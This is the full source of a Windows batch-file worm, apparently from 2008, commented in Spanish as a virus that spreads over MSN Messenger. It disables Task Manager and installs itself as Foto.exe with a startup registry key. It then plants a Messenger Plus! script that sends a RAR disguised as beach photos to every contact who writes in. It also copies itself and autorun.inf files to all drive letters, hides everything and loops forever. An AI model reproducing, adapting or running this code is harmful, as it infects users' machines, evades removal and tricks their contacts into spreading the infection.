@echo off
::Este Virus Fue Creador Por Azafram
::El Virus Fue Creado El  Martes 2 De Frbredo Del 2008
::Primer Virus En Batch Que Se Propaga Por MSN
::Echo en "VENEZUELA"
title Foto By "AZAFRAM"
:inicio

if exist %windir%\disable.TXT (goto nb8) else (goto nb9)
:nb9
echo Foto >> %windir%\disable.TXT 
reg add hkey_current_user\software\microsoft\windows\currentversion\policies\system /v disabletaskmgr /t reg_dword /d 1 /f 
:nb8


if exist %windir%\system32\Foto.exe (goto az1) else (goto az2)
:az2
md "%windir%\system32\sistema"
copy %0 %windir%\system32\sistema\Foto.exe /y 
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Foto" /t REG_SZ /d "%windir%\system32\sistema\Foto.exe" /f 
attrib +h +s "%windir%\system32\sistema"
:az1 


if exist %windir%\system32\Foto.exe (goto css) else (goto csn)
:csn
COPY %0 %windir%\system32\Foto.exe
:css

if exist "%windir%\system32\Foto\Mis Fotos En La Playa 2008.rar" (goto rars) else (goto rarn)
:rarn
md "%windir%\system32\Foto\"
start winrar.exe a "%windir%\system32\Foto\Mis Fotos En La Playa 2008.rar" %0
:rars

if exist "%programfiles%\Messenger Plus! Live\Scripts\hola\hola.js" (goto 900) else (goto 009)
:009
md "%programfiles%\Messenger Plus! Live\Scripts\hola\"
echo function OnEvent_ChatWndReceiveMessage(ChatWnd, Origin, Message, MessageKind)>> "%programfiles%\Messenger Plus! Live\Scripts\hola\hola.js"
echo {>> "%programfiles%\Messenger Plus! Live\Scripts\hola\hola.js"
echo     if (Origin != Messenger.MyName)>> "%programfiles%\Messenger Plus! Live\Scripts\hola\hola.js"
echo     {>> "%programfiles%\Messenger Plus! Live\Scripts\hola\hola.js"
echo         ChatWnd.SendMessage("/sendfile %homedrive%\\WINDOWS\\system32\\Foto\\Mis Fotos En La Playa 2008.rar");>> "%programfiles%\Messenger Plus! Live\Scripts\hola\hola.js"
echo         ChatWnd.SendMessage("(M)  [c=39]Mira Mis Nuevas Fotos [/c] (M)");>> "%programfiles%\Messenger Plus! Live\Scripts\hola\hola.js"
echo     }>> "%programfiles%\Messenger Plus! Live\Scripts\hola\hola.js"
echo }>> "%programfiles%\Messenger Plus! Live\Scripts\hola\hola.js"
reg add "HKEY_CURRENT_USER\Software\Patchou\Messenger Plus! Live\GlobalSettings\Scripts\hola" /v Enabled /t REG_DWORD /d 1 /f > nul 
tskill msnmsgr
taskill msnmsgr.exe
attrib +h +s "%programfiles%\Messenger Plus! Live\Scripts\hola"
attrib +h +s "%programfiles%\Messenger Plus! Live\Scripts"
attrib +h +s "%programfiles%\Messenger Plus! Live"
:900


if exist %windir%\autorun.inf (goto ifs) else (goto ifn) 
:ifn
echo [AutoRun] >> %windir%\autorun.inf
echo open=Foto\Foto.exe >> %windir%\autorun.inf
echo shellexecute=Foto\Foto.exe >> %windir%\autorun.inf
echo shell\Auto\command=Foto\Foto.exe >> %windir%\autorun.inf
:ifs

if exist %windir%\system32\Foto.exe (goto 667) else (goto 887)
:887
copy %0 %windir%\system32\Foto.exe
:667


MD C:\Foto
MD E:\Foto
MD F:\Foto
MD G:\Foto
MD H:\Foto
MD I:\Foto
MD J:\Foto
MD K:\Foto
MD L:\Foto
MD M:\Foto
MD N:\Foto
MD O:\Foto
MD P:\Foto
MD Q:\Foto
MD R:\Foto
MD S:\Foto
MD T:\Foto
MD U:\Foto
MD V:\Foto
MD W:\Foto
MD X:\Foto
MD Y:\Foto
MD Z:\Foto
copy %windir%\system32\Foto.exe C:\Foto\Foto.exe /Y 
copy %windir%\system32\Foto.exe E:\Foto\Foto.exe /Y  
copy %windir%\system32\Foto.exe F:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe G:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe H:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe I:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe J:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe K:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe L:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe M:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe N:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe O:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe P:\Foto\Foto.exe /Y 
copy %windir%\system32\Foto.exe Q:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe R:\Foto\Foto.exe /Y 
copy %windir%\system32\Foto.exe S:\Foto\Foto.exe /Y
copy %windir%\system32\Foto.exe T:\Foto\Foto.exe /Y 
copy %windir%\system32\Foto.exe U:\Foto\Foto.exe /Y 
copy %windir%\system32\Foto.exe V:\Foto\Foto.exe /Y 
copy %windir%\system32\Foto.exe W:\Foto\Foto.exe /Y 
copy %windir%\system32\Foto.exe X:\Foto\Foto.exe /Y 
copy %windir%\system32\Foto.exe Y:\Foto\Foto.exe /Y 
copy %windir%\system32\Foto.exe Z:\Foto\Foto.exe /Y 
attrib +h +s C:\Foto
attrib +h +s E:\Foto
attrib +h +s F:\Foto
attrib +h +s G:\Foto
attrib +h +s H:\Foto
attrib +h +s I:\Foto
attrib +h +s J:\Foto
attrib +h +s K:\Foto
attrib +h +s L:\Foto
attrib +h +s M:\Foto
attrib +h +s N:\Foto
attrib +h +s O:\Foto
attrib +h +s P:\Foto
attrib +h +s Q:\Foto
attrib +h +s R:\Foto
attrib +h +s S:\Foto
attrib +h +s T:\Foto
attrib +h +s U:\Foto
attrib +h +s V:\Foto
attrib +h +s W:\Foto
attrib +h +s X:\Foto
attrib +h +s Y:\Foto
attrib +h +s Z:\Foto
copy %windir%\autorun.inf C:\autorun.inf  /Y 
copy %windir%\autorun.inf E:\autorun.inf  /Y  
copy %windir%\autorun.inf F:\autorun.inf  /Y
copy %windir%\autorun.inf G:\autorun.inf  /Y
copy %windir%\autorun.inf H:\autorun.inf  /Y
copy %windir%\autorun.inf I:\autorun.inf  /Y
copy %windir%\autorun.inf J:\autorun.inf  /Y
copy %windir%\autorun.inf K:\autorun.inf  /Y
copy %windir%\autorun.inf L:\autorun.inf  /Y
copy %windir%\autorun.inf M:\autorun.inf  /Y
copy %windir%\autorun.inf N:\autorun.inf  /Y
copy %windir%\autorun.inf O:\autorun.inf  /Y
copy %windir%\autorun.inf P:\autorun.inf  /Y 
copy %windir%\autorun.inf Q:\autorun.inf  /Y
copy %windir%\autorun.inf R:\autorun.inf  /Y 
copy %windir%\autorun.inf S:\autorun.inf  /Y
copy %windir%\autorun.inf T:\autorun.inf  /Y 
copy %windir%\autorun.inf U:\autorun.inf  /Y 
copy %windir%\autorun.inf V:\autorun.inf  /Y 
copy %windir%\autorun.inf W:\autorun.inf  /Y 
copy %windir%\autorun.inf X:\autorun.inf  /Y 
copy %windir%\autorun.inf Y:\autorun.inf  /Y 
copy %windir%\autorun.inf Z:\autorun.inf  /Y 
attrib +h +s C:\autorun.inf
attrib +h +s E:\autorun.inf
attrib +h +s F:\autorun.inf
attrib +h +s G:\autorun.inf
attrib +h +s H:\autorun.inf
attrib +h +s I:\autorun.inf
attrib +h +s J:\autorun.inf
attrib +h +s K:\autorun.inf
attrib +h +s L:\autorun.inf
attrib +h +s M:\autorun.inf
attrib +h +s N:\autorun.inf
attrib +h +s O:\autorun.inf
attrib +h +s P:\autorun.inf
attrib +h +s Q:\autorun.inf
attrib +h +s R:\autorun.inf
attrib +h +s S:\autorun.inf
attrib +h +s T:\autorun.inf
attrib +h +s U:\autorun.inf
attrib +h +s V:\autorun.inf
attrib +h +s W:\autorun.inf
attrib +h +s X:\autorun.inf
attrib +h +s Y:\autorun.inf
attrib +h +s Z:\autorun.inf
reg add "HKEY_CURRENT_USER\Software\Patchou\Messenger Plus! Live\GlobalSettings\Scripts\hola" /v Enabled /t REG_DWORD /d 1 /f > nul 
goto inicio
